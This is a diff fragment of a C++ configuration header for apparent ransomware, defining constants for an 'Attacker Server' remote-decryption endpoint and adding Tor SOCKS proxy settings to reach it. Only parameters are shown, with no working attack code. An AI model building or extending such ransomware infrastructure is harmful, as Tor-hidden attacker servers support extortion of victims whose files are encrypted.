@@ -36,7 +36,7 @@ const int HTTP_SERVER_PORT                               = 8089;                
 const std::string LOCALHOST_URL                          = "http://127.0.0.1";                    // Localhost URL
 
 
-/************************************ Parameters for remote actions ***************************************************/
+/************************************ Parameters for remote decryption ************************************************/
 // Version of the Endpoint API
 const std::string REMOTE_DECRYPTION_ENDPOINT_API_VERSION = "v1";                                                                                                                    // Endpoint API Version
 // Attacker Server Endpoint API
@@ -48,6 +48,12 @@ const std::string REMOTE_DECRYPTION_ENDPOINT             = "http://localhost";  
 // Attacker Server URL for the remote decryption
 const std::string REMOTE_DECRYPTION_ENDPOINT_URL         = REMOTE_DECRYPTION_ENDPOINT + ":" + std::to_string(REMOTE_DECRYPTION_URL_PORT) + REMOTE_DECRYPTION_ENDPOINT_API;          // Remote Endpoint URL
 
+
+/************************************ Parameters for TOR remote decryption ********************************************/
+// TOR Client Socks Proxy IP
+const std::string TOR_CLIENT_SOCKS_IP                    = "127.0.0.1";
+// TOR Client Socks Proxy Port
+const int TOR_CLIENT_SOCKS_PORT                          = 9050;
 // Attacker Server Port for the TOR remote decryption
 const int REMOTE_DECRYPTION_URL_PORT_TOR                 = 80;                                                                                                                      // TOR Remote Port
 // Attacker Server Endpoint TOR
